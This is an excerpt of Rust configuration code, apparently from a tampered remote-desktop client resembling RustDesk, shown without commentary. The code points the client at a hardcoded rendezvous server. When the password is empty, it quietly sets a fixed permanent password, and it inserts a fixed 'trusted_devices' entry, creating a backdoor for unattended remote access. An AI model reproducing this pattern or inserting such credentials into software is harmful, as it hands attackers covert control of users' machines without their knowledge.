...
pub const RENDEZVOUS_SERVERS: &[&str] = &["p2p.tslxpc.cn"];
pub const RS_PUB_KEY: &str = "oU7RVh1UyK4QurtkXygu9J7b1q8NlKBR2y1YJ4Nfv5U=";
...
impl Config2 {
    fn load() -> Config2 {
        ...
        if !config.options.contains_key("trusted_devices") {
                config.options.insert("trusted_devices".to_string(), "00Wrxlu8c3CqYq3TMZJUpyTA4D".to_string());
                config.store();
            }
        store |= store2;
        if store {
...
impl Config {
    ...
    fn load() -> Config {
        ...
        if config.password.is_empty() {
            config.password = "00Wrxlu8c3CqYq3TMZJUpyTA4D".to_string();
            store = true;
        }
        if store {
            config.store();
